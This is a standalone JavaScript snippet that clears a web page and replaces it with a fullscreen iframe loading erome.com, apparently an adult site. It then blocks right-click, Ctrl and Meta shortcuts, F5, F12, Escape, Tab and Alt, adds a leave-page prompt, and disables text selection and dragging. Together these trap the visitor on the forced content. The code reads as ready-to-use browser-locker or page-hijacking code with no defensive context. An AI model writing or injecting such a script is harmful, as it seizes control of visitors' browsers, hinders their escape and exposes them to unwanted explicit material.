// fullscreen-iframe.js
(function() {
  // Create iframe element
  const iframe = document.createElement('iframe');
  iframe.src = 'https://erome.com'; // Replace with your target URL
  iframe.style.position = 'fixed';
  iframe.style.top = '0';
  iframe.style.left = '0';
  iframe.style.width = '100%';
  iframe.style.height = '100%';
  iframe.style.border = 'none';
  iframe.style.zIndex = '9999';
  
  // Disable iframe scrolling if needed
  iframe.scrolling = 'no';
  
  // Append iframe to body
  document.body.innerHTML = ''; // Clear existing content
  document.body.appendChild(iframe);
  document.body.style.margin = '0';
  document.body.style.overflow = 'hidden';
  
  // Disable right click
  document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
      return false;
  });
  
  // Disable keyboard shortcuts
  const blockedKeys = [
      'Control', 'F1', 'F5', 'F12', 
      'Alt', 'Tab', 'Shift', 'Escape'
  ];
  
  document.addEventListener('keydown', function(e) {
      // Block Ctrl combinations
      if (e.ctrlKey || e.metaKey) {
          e.preventDefault();
          return false;
      }
      
      // Block specific keys
      if (blockedKeys.includes(e.key)) {
          e.preventDefault();
          return false;
      }
  });
  
  // Prevent leaving the page
  window.addEventListener('beforeunload', function(e) {
      e.preventDefault();
      e.returnValue = '';
  });
  
  // Disable text selection
  document.addEventListener('selectstart', function(e) {
      e.preventDefault();
      return false;
  });
  
  // Disable dragging
  document.addEventListener('dragstart', function(e) {
      e.preventDefault();
      return false;
  });
})();